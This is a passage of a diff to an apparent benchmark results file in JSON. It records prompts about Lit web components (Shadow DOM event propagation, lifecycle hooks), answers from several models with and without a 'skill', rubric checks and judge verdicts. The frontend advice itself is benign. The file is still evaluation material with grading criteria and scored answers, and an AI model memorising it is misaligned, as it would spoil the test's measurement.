{\n      detail: { value: this.value },\n      bubbles: true,\n      composed: true,\n    })\n  );\n}\n```\n\nSee [reactive-properties.md](references/reactive-properties.md) for the full typed event pattern and [lifecycle.md](references/lifecycle.md) for `updateComplete` timing.",
+            "cost_usd": 0.008263,
+            "rubric": [
+              {
+                "name": "identifies composed:true is required",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "composed: true",
+                "why": "the specific knob"
+              },
+              {
+                "name": "mentions bubbles:true",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "bubbles: true",
+                "why": "usually paired with composed for upward propagation"
+              },
+              {
+                "name": "mentions Shadow DOM boundary",
+                "kind": "must_contain",
+                "passed": true,
+                "evidence": "Shadow DOM Boundary",
+                "why": "explains why the event was stopped"
+              }
+            ],
+            "rubric_pass_rate": 1.0
           },
-          {
-            "name": "mentions Shadow DOM boundary",
-            "kind": "must_contain",
-            "passed": true,
-            "evidence": "shadow DOM boundary",
-            "why": "explains why the event was stopped"
+          "judge": {
+            "winner": "skill",
+            "reasoning": "Both answers correctly identify composed:true and bubbles:true as required to cross Shadow DOM boundaries, but Answer A goes further by including the bonus content about typed Event subclasses with static readonly type, which is explicitly mentioned in the focus area. Answer A also provides a comparison table, updateComplete timing guidance, and more comprehensive TypeScript examples, making it more complete and useful overall.",
+            "per_criterion": [
+              {
+                "name": "identifies composed:true is required",
+                "better": "tie"
+              },
+              {
+                "name": "mentions bubbles:true",
+                "better": "tie"
+              },
+              {
+                "name": "mentions Shadow DOM boundary",
+                "better": "tie"
+              }
+            ]
           }
-        ],
-        "rubric_pass_rate": 1.0
-      },
-      "skill": {
-        "text": "# CustomEvent Not Crossing Shadow DOM Boundary\n\nThis is one of the most common gotchas in Lit (and Web Components in general). By default, a `CustomEvent` will **not** cross shadow DOM boundaries, even if it bubbles. You need to explicitly opt in.\n\n## The Fix\n\nWhen you dispatch the event, set both `bubbles: true` and `composed: true`:\n\n```js\nthis.dispatchEvent(new CustomEvent('my-event', {\n  detail: { value: 42 },\n  bubbles: true,\n  composed: true,   // 👈 this is the key\n}));\n```\n\n## Why?\n\n- **`bubbles: true`** — lets the event propagate up the DOM tree.\n- **`composed: true`** — allows the event to escape the shadow root and be observable in the light DOM (i.e., by your parent component).\n\nWithout `composed: true`, the event will bubble *inside* your component's shadow root but stop dead at the shadow boundary. The parent listener never sees it.\n\n## Quick Checklist\n\n1. ✅ Are you setting `composed: true`?\n2. ✅ Are you setting `bubbles: true`?\n3. ✅ Is the parent listener attached to the host element (or an ancestor), not something inside the shadow root?\n4. ✅ If you're re-dispatching, remember `event.target` will be retargeted to your host element from outside the shadow root — `event.composedPath()` gives you the original path.\n\n## A Note on Naming & Semantics\n\nFor events that represent *internal implementation details*, consider keeping `composed: false` and only re-dispatching a public-facing event. This is good encapsulation hygiene — but for most user-facing events (clicks, value changes, etc.), `composed: true` is what you want.\n\n```js\n// Public, crosses shadow boundary\nthis.dispatchEvent(new CustomEvent('value-changed', {\n  detail: { value: this.value },\n  bubbles: true,\n  composed: true,\n}));\n```\n\nThat should get your parent listener firing again.",
-        "cost_usd": 0.034607,
-        "rubric": [
-          {
-            "name": "identifies composed:true is required",
-            "kind": "any_of",
-            "passed": true,
-            "evidence": "composed: true",
-            "why": "the specific knob"
+        },
+        "opus": {
+          "expectation_met": true,
+          "baseline": {
+            "text": "# The Issue: Event Propagation Across Shadow DOM\n\nBy default, `CustomEvent`s **don't cross shadow DOM boundaries**. Since Lit components use shadow DOM, an event dispatched from inside your component will be trapped unless you configure it properly.\n\n## The Fix\n\nYou need to set both `bubbles: true` and `composed: true`:\n\n```js\nthis.dispatchEvent(new CustomEvent('my-event', {\n  detail: { someData: 123 },\n  bubbles: true,\n  composed: true  // 👈 This is the key — allows the event to escape shadow DOM\n}));\n```\n\n## What Each Option Does\n\n| Option | Purpose |\n|--------|---------|\n| `bubbles: true` | Lets the event bubble up the DOM tree (instead of firing only on the target) |\n| `composed: true` | Lets the event cross shadow DOM boundaries into the light DOM |\n\nWithout `composed: true`, the event will bubble *within* your component's shadow root, but will stop at the shadow boundary and never reach the parent.\n\n## A Note on `event.target`\n\nOnce the event crosses the shadow boundary, `event.target` will be **retargeted** to your custom element (the host), not the inner element that originally dispatched it. If you need access to the original target, use `event.composedPath()[0]`.\n\n## Bonus: Lit Convention\n\nLit's docs recommend dispatching events from a method so consumers can override behavior, and naming events with a hyphen (e.g., `item-selected`):\n\n```js\nprivate _notify() {\n  this.dispatchEvent(new CustomEvent('item-selected', {\n    detail: { id: this.itemId },\n    bubbles: true,\n    composed: true,\n  }));\n}\n```\n\nThat should get your parent listener firing correctly.",
+            "cost_usd": 0.04524,
+            "rubric": [
+              {
+                "name": "identifies composed:true is required",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "composed: true",
+                "why": "the specific knob"
+              },
+              {
+                "name": "mentions bubbles:true",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "bubbles: true",
+                "why": "usually paired with composed for upward propagation"
+              },
+              {
+                "name": "mentions Shadow DOM boundary",
+                "kind": "must_contain",
+                "passed": true,
+                "evidence": "Shadow DOM",
+                "why": "explains why the event was stopped"
+              }
+            ],
+            "rubric_pass_rate": 1.0
           },
-          {
-            "name": "mentions bubbles:true",
-            "kind": "any_of",
-            "passed": true,
-            "evidence": "bubbles: true",
-            "why": "usually paired with composed for upward propagation"
+          "skill": {
+            "text": "Almost certainly your event isn't crossing the Shadow DOM boundary. By default, events dispatched from inside a shadow root are **retargeted** and don't bubble out unless you explicitly opt in.\n\n## The fix\n\nSet both `bubbles: true` and `composed: true` on the event:\n\n```ts\nthis.dispatchEvent(new CustomEvent('my-event', {\n  detail: { value: 42 },\n  bubbles: true,\n  composed: true,  // <-- required to cross Shadow DOM\n}));\n```\n\n- `bubbles: true` — event walks up the DOM tree\n- `composed: true` — event crosses Shadow DOM boundaries\n\nWithout `composed: true`, the event bubbles only within your component's shadow root and stops at the host. The parent never sees it.\n\n## Recommended pattern: typed event class\n\nFor a more robust, type-safe approach, define a concrete event class and export it so consumers get autocomplete and type checking:\n\n```ts\n// my-component.ts\nexport class ValueChangeEvent extends Event {\n  static readonly type = 'value-change' as const;\n  constructor(public readonly value: number) {\n    super(ValueChangeEvent.type, { bubbles: true, composed: true });\n  }\n}\n\n@customElement('my-component')\nexport class MyComponent extends LitElement {\n  private async _onClick() {\n    this.value = 42;\n    await this.updateComplete;  // ensure DOM reflects state before listeners run\n    this.dispatchEvent(new ValueChangeEvent(this.value));\n  }\n  // ...\n}\n\ndeclare global {\n  interface HTMLElementEventMap {\n    'value-change': ValueChangeEvent;\n  }\n}\n```\n\nThen in the parent:\n\n```ts\nimport { ValueChangeEvent } from './my-component.js';\n\nel.addEventListener(ValueChangeEvent.type, (e) => {\n  console.log(e.value);  // fully typed\n});\n```\n\n## Other things to check if it still doesn't work\n\n1. **Listener attached too early?** If the parent attaches the listener before the child upgrades, that's fine — `addEventListener` doesn't care about element upgrade order. But if you're using inline `@event` bindings in a Lit template, make sure the parent itself has rendered.\n2. **Wrong event name** — check for typos; event names are case-sensitive.\n3. **`stopPropagation()` somewhere in between** — an intermediate component may be swallowing it.\n4. **Dispatching before render** — if you dispatch in `connectedCallback` before `firstUpdated`, the parent listener may not be wired up yet. Dispatch after `await this.updateComplete` to be safe.\n\nThe 90% answer is `composed: true`. Add it and the event will reach your parent.",
+            "cost_usd": 0.148485,
+            "rubric": [
+              {
+                "name": "identifies composed:true is required",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "composed: true",
+                "why": "the specific knob"
+              },
+              {
+                "name": "mentions bubbles:true",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "bubbles: true",
+                "why": "usually paired with composed for upward propagation"
+              },
+              {
+                "name": "mentions Shadow DOM boundary",
+                "kind": "must_contain",
+                "passed": true,
+                "evidence": "Shadow DOM boundary",
+                "why": "explains why the event was stopped"
+              }
+            ],
+            "rubric_pass_rate": 1.0
           },
-          {
-            "name": "mentions Shadow DOM boundary",
-            "kind": "must_contain",
-            "passed": true,
-            "evidence": "Shadow DOM Boundary",
-            "why": "explains why the event was stopped"
+          "judge": {
+            "winner": "skill",
+            "reasoning": "Both answers correctly identify composed:true, bubbles:true, and Shadow DOM boundaries as the core issue. However, Answer B goes further by including the bonus criterion of typed Event subclasses with static readonly type, complete TypeScript examples, HTMLElementEventMap augmentation, and practical debugging tips. Answer A is solid but lacks the typed event class pattern that the rubric specifically rewards.",
+            "per_criterion": [
+              {
+                "name": "identifies composed:true is required",
+                "better": "tie"
+              },
+              {
+                "name": "mentions bubbles:true",
+                "better": "tie"
+              },
+              {
+                "name": "mentions Shadow DOM boundary",
+                "better": "tie"
+              }
+            ]
           }
-        ],
-        "rubric_pass_rate": 1.0
-      },
-      "judge": {
-        "winner": "tie",
-        "reasoning": "Both answers correctly identify composed:true and bubbles:true as required to cross Shadow DOM boundaries, explain the Shadow DOM boundary issue clearly, and provide practical code examples. Answer A adds a typed helper method and more sanity checks, while Answer B adds useful notes about event.composedPath() and encapsulation hygiene. Neither mentions typed Event subclasses with static readonly type (the bonus criterion), so they're essentially equal on the rubric criteria.",
-        "per_criterion": [
-          {
-            "name": "identifies composed:true is required",
-            "better": "tie"
+        },
+        "sonnet": {
+          "expectation_met": true,
+          "baseline": {
+            "text": "## The Problem: Custom Events and `composed`\n\nBy default, Custom Events **do not cross the Shadow DOM boundary**. They stop at the shadow root and never reach the parent component listening in the light DOM.\n\n---\n\n## The Fix\n\nYou need to set **both** `bubbles: true` and `composed: true` when dispatching the event:\n\n```javascript\n// ❌ Wrong - event is trapped inside the shadow root\nthis.dispatchEvent(new CustomEvent('my-event', {\n  detail: { message: 'hello' },\n  bubbles: true,        // bubbles up through shadow DOM nodes only\n  // composed: false    // default - does NOT cross shadow boundary\n}));\n\n// ✅ Correct - event escapes the shadow root\nthis.dispatchEvent(new CustomEvent('my-event', {\n  detail: { message: 'hello' },\n  bubbles: true,   // bubbles up through the DOM\n  composed: true   // crosses the shadow DOM boundary ✅\n}));\n```\n\n---\n\n## What Each Option Does\n\n| Option | Description |\n|---|---|\n| `bubbles: false` | Event stays on the dispatching element only |\n| `bubbles: true` | Event bubbles up through the DOM tree |\n| `composed: false` | Event is **blocked** at the shadow root (default) |\n| `composed: true` | Event **crosses** shadow DOM boundaries into the light DOM |\n\n---\n\n## Full Lit Example\n\n```javascript\n// child-component.js\nimport { LitElement, html } from 'lit';\n\nclass ChildComponent extends LitElement {\n  _handleClick() {\n    this.dispatchEvent(new CustomEvent('child-clicked', {\n      detail: { value: 42 },\n      bubbles: true,\n      composed: true  // 👈 key option\n    }));\n  }\n\n  render() {\n    return html`<button @click=${this._handleClick}>Click me</button>`;\n  }\n}\ncustomElements.define('child-component', ChildComponent);\n```\n\n```javascript\n// parent-component.js\nimport { LitElement, html } from 'lit';\n\nclass ParentComponent extends LitElement {\n  _onChildClicked(e) {\n    console.log('Received event:', e.detail.value); // 42 ✅\n  }\n\n  render() {\n    return html`\n      <child-component\n        @child-clicked=${this._onChildClicked}>\n      </child-component>\n    `;\n  }\n}\ncustomElements.define('parent-component', ParentComponent);\n```\n\n---\n\n## Important Caveat: `e.target` Will Be Retargeted\n\nWhen `composed: true` is used, the browser **retargets** `e.target` to the host element (`<child-component>`) as the event crosses the boundary — the internal element that originally fired it is hidden. This is expected Shadow DOM behavior.\n\n```javascript\n_onChildClicked(e) {\n  console.log(e.target); // <child-component> not the internal <button>\n}\n```\n\n---\n\n## Quick Rule of Thumb\n\n> If you want a parent **outside** your Lit component to hear your event, always use `bubbles: true, composed: true`.",
+            "cost_usd": 0.011741999999999999,
+            "rubric": [
+              {
+                "name": "identifies composed:true is required",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "composed: true",
+                "why": "the specific knob"
+              },
+              {
+                "name": "mentions bubbles:true",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "bubbles: true",
+                "why": "usually paired with composed for upward propagation"
+              },
+              {
+                "name": "mentions Shadow DOM boundary",
+                "kind": "must_contain",
+                "passed": true,
+                "evidence": "Shadow DOM boundary",
+                "why": "explains why the event was stopped"
+              }
+            ],
+            "rubric_pass_rate": 1.0
           },
-          {
-            "name": "mentions bubbles:true",
-            "better": "tie"
+          "skill": {
+            "text": "## The Problem: Shadow DOM Event Retargeting\n\nCustom events don't cross Shadow DOM boundaries by default. When you dispatch an event inside a shadow root, it stops there — the parent component never sees it.\n\nThe fix requires **two flags** in the event constructor:\n\n```typescript\n// ❌ Stays trapped inside the shadow root\nthis.dispatchEvent(new CustomEvent('user-selected', { detail: { id: 42 } }));\n\n// ✅ Crosses shadow boundaries and bubbles up the DOM tree\nthis.dispatchEvent(new CustomEvent('user-selected', {\n  detail: { id: 42 },\n  bubbles: true,   // travels up the DOM tree\n  composed: true,  // crosses shadow root boundaries\n}));\n```\n\nBoth flags are required together:\n\n| Flag | What it does | Without it |\n|------|-------------|------------|\n| `bubbles` | Travels up the DOM tree | Event stays on the dispatching element |\n| `composed` | Crosses shadow root boundaries | Event stops at the shadow root edge |\n\n---\n\n## The Recommended Pattern: Typed Event Classes\n\nRather than raw `CustomEvent`, define a concrete event class. This gives you type safety on both the dispatching and listening sides, and makes the `bubbles`/`composed` defaults impossible to forget.\n\n**`events/user-selected-event.ts`** — define once, import everywhere:\n\n```typescript\nexport class UserSelectedEvent extends Event {\n  static readonly type = 'user-selected';\n\n  constructor(public readonly userId: number) {\n    super(UserSelectedEvent.type, {\n      bubbles: true,\n      composed: true,\n    });\n  }\n}\n\n// Teach TypeScript about the event on the element's interface\ndeclare global {\n  interface HTMLElementEventMap {\n    'user-selected': UserSelectedEvent;\n  }\n}\n```\n\n**Dispatching component** — dispatch after `updateComplete` so listeners see the rendered state:\n\n```typescript\nimport { LitElement, html } from 'lit';\nimport { customElement } from 'lit/decorators.js';\nimport { UserSelectedEvent } from './events/user-selected-event.js';\n\n@customElement('user-list')\nexport class UserList extends LitElement {\n  private async _handleClick(userId: number) {\n    // Do any async work first, then dispatch after render is settled\n    await this.updateComplete;\n    this.dispatchEvent(new UserSelectedEvent(userId));\n  }\n\n  render() {\n    return html`\n      <button @click=${() => this._handleClick(42)}>Select user</button>\n    `;\n  }\n}\n```\n\n**Listening component** — the event type is fully inferred from `HTMLElementEventMap`:\n\n```typescript\nimport { LitElement, html } from 'lit';\nimport { customElement } from 'lit/decorators.js';\nimport { UserSelectedEvent } from './events/user-selected-event.js';\n\n@customElement('app-shell')\nexport class AppShell extends LitElement {\n  render() {\n    return html`\n      <user-list\n        @user-selected=${this._onUserSelected}\n      ></user-list>\n    `;\n  }\n\n  // userId is typed as number — no casting needed\n  private _onUserSelected(e: UserSelectedEvent) {\n    console.log(e.userId);\n  }\n}\n```\n\n---\n\n## Quick Checklist\n\nIf the event still isn't arriving, run through these:\n\n- [ ] **Both `bubbles: true` and `composed: true` are set** — one alone isn't enough\n- [ ] **The listener is on the host element or an ancestor**, not inside the shadow root of the dispatching component\n- [ ] **`e.stopPropagation()` isn't called** somewhere between the dispatch point and the listener\n- [ ] **The event name matches exactly** — `'user-selected'` vs `'userSelected'` are different strings\n- [ ] **The listener is attached before the event fires** — especially relevant with `firstUpdated` timing",
+            "cost_usd": 0.025856999999999998,
+            "rubric": [
+              {
+                "name": "identifies composed:true is required",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "composed: true",
+                "why": "the specific knob"
+              },
+              {
+                "name": "mentions bubbles:true",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "bubbles: true",
+                "why": "usually paired with composed for upward propagation"
+              },
+              {
+                "name": "mentions Shadow DOM boundary",
+                "kind": "must_contain",
+                "passed": true,
+                "evidence": "Shadow DOM",
+                "why": "explains why the event was stopped"
+              }
+            ],
+            "rubric_pass_rate": 1.0
           },
-          {
-            "name": "mentions Shadow DOM boundary",
-            "better": "tie"
+          "judge": {
+            "winner": "skill",
+            "reasoning": "Both answers correctly identify composed:true and bubbles:true as required to cross Shadow DOM boundaries, but Answer B goes further by providing the bonus content about typed Event subclasses with static readonly type, TypeScript integration with HTMLElementEventMap, and a practical debugging checklist. Answer B is more comprehensive and production-ready while still covering all the core criteria.",
+            "per_criterion": [
+              {
+                "name": "identifies composed:true is required",
+                "better": "tie"
+              },
+              {
+                "name": "mentions bubbles:true",
+                "better": "tie"
+              },
+              {
+                "name": "mentions Shadow DOM boundary",
+                "better": "tie"
+              }
+            ]
           }
-        ]
+        }
       }
     },
     {
       "id": "lifecycle-which-callback",
       "prompt": "In a Lit component, where should I put each kind of work:\n(a) compute a derived property from this.someInput before render,\n(b) one-time DOM measurement of a child element after first render,\n(c) calling an external API after every render that changed an input.\nWhich lifecycle method for each, and why?\n",
       "expectation": "skill_wins",
-      "expectation_met": false,
-      "baseline": {
-        "text": "# Lit Component Lifecycle: Where to Put Each Kind of Work\n\n## (a) Compute a derived property from `this.someInput` before render\n\n**Use `willUpdate(changedProperties)`**\n\n```js\nwillUpdate(changedProperties) {\n  if (changedProperties.has('someInput')) {\n    this.derivedValue = expensiveCompute(this.someInput);\n  }\n}\n```\n\n**Why:** `willUpdate` runs *before* `render()` on every update cycle. Setting reactive properties here is cheap — it does **not** trigger another update. It's specifically designed for computing derived state from inputs so `render()` can use it synchronously. Doing this in `render()` itself would recompute on every render even when `someInput` hasn't changed; doing it in `updated()` would be too late and would force a second render.\n\n## (b) One-time DOM measurement of a child element after first render\n\n**Use `firstUpdated(changedProperties)`**\n\n```js\nfirstUpdated() {\n  const child = this.renderRoot.querySelector('.target');\n  this.childWidth = child.getBoundingClientRect().width;\n}\n```\n\n**Why:** `firstUpdated` fires exactly once, after the component's DOM is rendered for the first time. The shadow DOM (and thus child elements) is guaranteed to exist, so measurements are safe. Using `connectedCallback` would be too early (DOM not rendered yet); using `updated` would needlessly run on every update.\n\n## (c) Calling an external API after every render that changed an input\n\n**Use `updated(changedProperties)`**\n\n```js\nupdated(changedProperties) {\n  if (changedProperties.has('someInput')) {\n    fetch(`/api/data?q=${this.someInput}`)\n      .then(r => r.json())\n      .then(data => { this.data = data; }); // safely triggers re-render\n  }\n}\n```\n\n**Why:** `updated` runs after every render (including the first), and `changedProperties` lets you gate the side effect to only when the relevant input actually changed. It's the right place for side effects involving external systems or DOM that's just been committed. Setting reactive state here is safe — it will schedule a new update rather than invalidate the current one (unlike `willUpdate`, where you should avoid async side effects).\n\n---\n\n## Quick mental model\n\n| Hook | Timing | Use for |\n|------|--------|---------|\n| `willUpdate` | Before render, every update | **Derived state** from inputs (sync, no side effects) |\n| `render` | Returns template | Pure description of UI |\n| `firstUpdated` | After first DOM commit, once | **One-time** DOM setup/measurement |\n| `updated` | After every DOM commit | **Side effects** (API calls, manual DOM, observers) |\n\nThe guiding principle: **`willUpdate` = compute, `render` = describe, `updated` = react.**",
-        "cost_usd": 0.040581500000000006,
-        "rubric": [
-          {
-            "name": "mentions willUpdate",
-            "kind": "must_contain",
-            "passed": true,
-            "evidence": "willUpdate",
-            "why": "derived state before render"
+      "judge_focus": "The better answer maps the three tasks to willUpdate, firstUpdated,\nand updated, and explains the ordering and \"changed properties\"\nparameter where relevant.\n",
+      "models": {
+        "haiku": {
+          "expectation_met": true,
+          "baseline": {
+            "text": "# Lit Lifecycle Methods by Use Case\n\n## (a) Compute derived property from `this.someInput` before render\n**→ Use a getter or `willUpdate()`**\n\n```typescript\n// Option 1: Simple getter (preferred for most cases)\nget derivedProperty() {\n  return this.someInput?.toUpperCase();\n}\n\nrender() {\n  return html`<p>${this.derivedProperty}</p>`;\n}\n\n// Option 2: willUpdate() if computation is expensive\nwillUpdate(changedProperties) {\n  if (changedProperties.has('someInput')) {\n    this.derivedProperty = expensiveComputation(this.someInput);\n  }\n}\n```\n\n**Why:** Getters are reactive and re-compute on every render. `willUpdate()` runs *before* render, so derived state is ready when `render()` executes. Avoids stale values.\n\n---\n\n## (b) One-time DOM measurement of child element after first render\n**→ Use `firstUpdated()`**\n\n```typescript\nfirstUpdated() {\n  const child = this.shadowRoot?.querySelector('.my-child');\n  this.childHeight = child?.offsetHeight;\n}\n\nrender() {\n  return html`<div class=\"my-child\"></div>`;\n}\n```\n\n**Why:** `firstUpdated()` runs once after the first render completes and DOM is painted. Perfect for measurements that require layout information. Using `updated()` would re-measure unnecessarily on every change.\n\n---\n\n## (c) Call external API after every render that changed an input\n**→ Use `updated()`**\n\n```typescript\nupdated(changedProperties) {\n  if (changedProperties.has('userId')) {\n    this.fetchUserData(this.userId);\n  }\n}\n\nasync fetchUserData(id) {\n  const response = await fetch(`/api/users/${id}`);\n  this.userData = await response.json();\n}\n```\n\n**Why:** `updated()` runs *after* render completes and DOM is committed. You can check `changedProperties` to avoid unnecessary API calls. This is the right place for side effects that depend on rendered state.\n\n---\n\n## Quick Reference Table\n\n| Task | Method | Timing | Why |\n|------|--------|--------|-----|\n| Derived properties | Getter or `willUpdate()` | Before render | Ensures values ready for template |\n| First-time DOM measurement | `firstUpdated()` | After first render | DOM is painted; runs once |\n| Side effects (API calls) | `updated()` | After every render | Can check what changed; DOM committed |",
+            "cost_usd": 0.003156,
+            "rubric": [
+              {
+                "name": "mentions willUpdate",
+                "kind": "must_contain",
+                "passed": true,
+                "evidence": "willUpdate",
+                "why": "derived state before render"
+              },
+              {
+                "name": "mentions firstUpdated",
+                "kind": "must_contain",
+                "passed": true,
+                "evidence": "firstUpdated",
+                "why": "one-time post-first-render setup"
+              },
+              {
+                "name": "mentions updated",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "updated(",
+                "why": "post-update side effects"
+              },
+              {
+                "name": "mentions changedProperties parameter",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "changedProperties",
+                "why": "gates work on what actually changed"
+              }
+            ],
+            "rubric_pass_rate": 1.0
           },
-          {
-            "name": "mentions firstUpdated",
-            "kind": "must_contain",
-            "passed": true,
-            "evidence": "firstUpdated",
-            "why": "one-time post-first-render setup"
+          "skill": {
+            "text": "# Lifecycle Placement Guide\n\n## (a) Compute a derived property from `this.someInput` before render\n\n**Use `willUpdate(changedProperties)`**\n\n```typescript\nwillUpdate(changedProperties: PropertyValues) {\n  if (changedProperties.has('someInput')) {\n    this.derivedValue = expensiveCompute(this.someInput);\n  }\n}\n\nrender() {\n  return html`<div>${this.derivedValue}</div>`;\n}\n```\n\n**Why:**\n- Runs once per update cycle, *before* `render()` — so `render()` sees the computed value\n- `render()` must be pure (no side effects, no mutations); `willUpdate()` is the designated place for derived state\n- If you compute in `render()`, you recompute on every render call (wasteful) and risk impure side effects\n- If you compute in `updated()`, you've already rendered with stale data, forcing a second cycle\n\n---\n\n## (b) One-time DOM measurement of a child element after first render\n\n**Use `firstUpdated(changedProperties)`**\n\n```typescript\nfirstUpdated(changedProperties: PropertyValues) {\n  const child = this.shadowRoot!.querySelector('.my-child');\n  this.childHeight = child!.offsetHeight;\n  // or: this.childWidth = child!.getBoundingClientRect().width\n}\n\nrender() {\n  return html`<div class=\"my-child\">Content</div>`;\n}\n```\n\n**Why:**\n- Runs exactly once, after the first `render()` completes and the DOM is stable\n- DOM is guaranteed to exist and be laid out (no `offsetHeight` of 0)\n- Cleaner than `updated()` because you don't need to check `changedProperties` or guard against re-running\n- If you measure in `render()`, the DOM hasn't been painted yet (measurements are unreliable)\n- If you measure in `updated()` without a guard, you measure on every property change (wasteful and may trigger layout thrashing)\n\n---\n\n## (c) Calling an external API after every render that changed an input\n\n**Use `updated(changedProperties)` with a guard, OR use `Task` (preferred)**\n\n### Option 1: `updated()` with a guard (simple case)\n\n```typescript\nupdated(changedProperties: PropertyValues) {\n  if (changedProperties.has('userId')) {\n    this.fetchUserData(this.userId);\n  }\n}\n\nprivate async fetchUserData(id: string) {\n  const response = await fetch(`/api/users/${id}`);\n  this.userData = await response.json();\n}\n```\n\n**Why:**\n- Runs after every render, so you can check which properties changed\n- Guard with `changedProperties.has()` to avoid redundant API calls\n- Simple, one-off logic; no need for a full Task\n\n### Option 2: `Task` (recommended for most cases)\n\n```typescript\nprivate _userTask = new Task(this, {\n  task: async ([userId], { signal }) => {\n    const response = await fetch(`/api/users/${userId}`, { signal });\n    return response.json();\n  },\n  args: () => [this.userId],\n});\n\nrender() {\n  return this._userTask.render({\n    pending: () => html`<p>Loading...</p>`,\n    complete: (data) => html`<p>${data.name}</p>`,\n    error: (e) => html`<p>Error: ${e.message}</p>`,\n  });\n}\n```\n\n**Why:**\n- Automatic cancellation if `userId` changes before the fetch completes (prevents race conditions)\n- Built-in status tracking (pending, complete, error) — no separate state variables\n- Cleaner than `updated()` + manual state management\n- Handles argument tracking automatically; re-runs only when `args()` changes\n- Use `Task` whenever the work is request/response (fetch, DB query, etc.)\n\n---\n\n## Summary Table\n\n| Work | Method | Why |\n|------|--------|-----|\n| Derived state (compute before render) | `willUpdate()` | Runs before render; pure; computed once per cycle |\n| One-time DOM measurement | `firstUpdated()` | Runs once after first render; DOM is stable and laid out |\n| API call on input change | `Task` (preferred) or `updated()` with guard | Task: auto-cancellation, status tracking, race prevention. `updated()`: simpler for one-off logic |\n\n**Golden rule:** `render()` is pure (no side effects). Everything else goes in the lifecycle hooks that match the timing and frequency you need.",
+            "cost_usd": 0.00936,
+            "rubric": [
+              {
+                "name": "mentions willUpdate",
+                "kind": "must_contain",
+                "passed": true,
+                "evidence": "willUpdate",
+                "why": "derived state before render"
+              },
+              {
+                "name": "mentions firstUpdated",
+                "kind": "must_contain",
+                "passed": true,
+                "evidence": "firstUpdated",
+                "why": "one-time post-first-render setup"
+              },
+              {
+                "name": "mentions updated",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "updated(",
+                "why": "post-update side effects"
+              },
+              {
+                "name": "mentions changedProperties parameter",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "changedProperties",
+                "why": "gates work on what actually changed"
+              }
+            ],
+            "rubric_pass_rate": 1.0
           },
-          {
-            "name": "mentions updated",
-            "kind": "any_of",
-            "passed": true,
-            "evidence": "updated(",
-            "why": "post-update side effects"
-          },
-          {
-            "name": "mentions changedProperties parameter",
-            "kind": "any_of",
-            "passed": true,
-            "evidence": "changedProperties",
-            "why": "gates work on what actually changed"
+          "judge": {
+            "winner": "skill",
+            "reasoning": "Both answers correctly map the three tasks to willUpdate, firstUpdated, and updated, and both mention the changedProperties parameter. Answer B is more thorough in its explanations, explicitly explaining why each alternative placement would be wrong, and adds the Task pattern as a modern best practice for async API calls. Answer A is solid but slightly less detailed in its reasoning and doesn't explain the pitfalls of alternative approaches as clearly.",
+            "per_criterion": [
+              {
+                "name": "mentions willUpdate",
+                "better": "tie"
+              },
+              {
+                "name": "mentions firstUpdated",
+                "better": "tie"
+              },
+              {
+                "name": "mentions updated",
+                "better": "tie"
+              },
+              {
+                "name": "mentions changedProperties parameter",
+                "better": "tie"
+              }
+            ]
           }
-        ],
-        "rubric_pass_rate": 1.0
-      },
-      "skill": {
-        "text": "# Lit Component Lifecycle Placement\n\nHere's where each kind of work belongs, and why:\n\n## (a) Compute a derived property from `this.someInput` before render\n\n**Use `willUpdate(changedProperties)`**\n\n```js\nwillUpdate(changedProperties) {\n  if (changedProperties.has('someInput')) {\n    this.derived = expensiveTransform(this.someInput);\n  }\n}\n```\n\n**Why:** `willUpdate` runs *before* `render()` as part of the same update cycle. Setting reactive properties here does **not** trigger another update, so it's the safe, idiomatic spot for derived state. Avoid `update()` for this — it's lower-level and you'd have to remember to call `super.update()`. Avoid doing it inside `render()` itself, since `render()` should be a pure function of state.\n\n## (b) One-time DOM measurement of a child element after first render\n\n**Use `firstUpdated(changedProperties)`**\n\n```js\nfirstUpdated() {\n  const { width } = this.renderRoot\n    .querySelector('.target')\n    .getBoundingClientRect();\n  this._measuredWidth = width;\n}\n```\n\n**Why:** `firstUpdated` fires exactly once, after the component's DOM has been rendered and is queryable via `this.renderRoot` / `this.shadowRoot`. It's the canonical hook for one-time setup that depends on rendered children — measuring, attaching third-party libraries to an element, focusing an input, etc. `connectedCallback` runs too early (no DOM yet), and `updated` runs every time (wasteful for one-time work).\n\n## (c) Call an external API after every render that changed an input\n\n**Use `updated(changedProperties)`**\n\n```js\nupdated(changedProperties) {\n  if (changedProperties.has('query')) {\n    fetch(`/api/search?q=${encodeURIComponent(this.query)}`)\n      .then(r => r.json())\n      .then(data => { this.results = data; }); // triggers another update\n  }\n}\n```\n\n**Why:** `updated` runs after every render commit, and `changedProperties` lets you gate the side effect to only the inputs that actually changed (avoiding redundant fetches). It's the right place for *post-render side effects* — DOM reads/writes, network calls, dispatching events — and it's safe to set reactive properties here (they'll schedule a new update without causing an infinite loop, as long as you guard with `changedProperties.has(...)`).\n\n## Quick summary\n\n| Phase | Hook | Use it for |\n|---|---|---|\n| Pre-render, same cycle | `willUpdate` | Derived state from inputs |\n| Post-render, once | `firstUpdated` | Initial DOM measurement/setup |\n| Post-render, every change | `updated` | Side effects keyed off `changedProperties` |\n\nThe mental model: **`willUpdate` shapes what you render, `firstUpdated`/`updated` react to what you rendered.**",
-        "cost_usd": 0.0407115,
-        "rubric": [
-          {
-            "name": "mentions willUpdate",
-            "kind": "must_contain",
-            "passed": true,
-            "evidence": "willUpdate",
-            "why": "derived state before render"
+        },
+        "opus": {
+          "expectation_met": true,
+          "baseline": {
